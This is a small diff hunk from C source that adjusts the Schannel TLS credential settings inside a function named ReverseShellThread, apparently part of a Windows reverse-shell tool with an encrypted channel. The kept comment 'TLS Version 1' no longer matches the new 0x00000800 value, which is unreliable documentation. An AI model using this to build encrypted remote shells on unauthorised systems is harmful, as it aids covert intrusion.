@@ -143,9 +143,8 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     SECURITY_STATUS status;
     SCHANNEL_CRED cred = {
         .dwVersion = SCHANNEL_CRED_VERSION,
-        .dwFlags = SCH_CRED_AUTO_CRED_VALIDATION //Automatically validate server cert
-        | SCH_CRED_NO_DEFAULT_CREDS, //No need Client Cert
-        .grbitEnabledProtocols = SP_PROT_TLS1_CLIENT, //TLS Version 1
+        .dwFlags = SCH_CRED_AUTO_CRED_VALIDATION | SCH_CRED_NO_DEFAULT_CREDS, //Automatically validate server cert //No need Client Cert
+        .grbitEnabledProtocols = 0x00000800, //TLS Version 1
         .paCred = &serverCert //Load Server Cert
     };
 
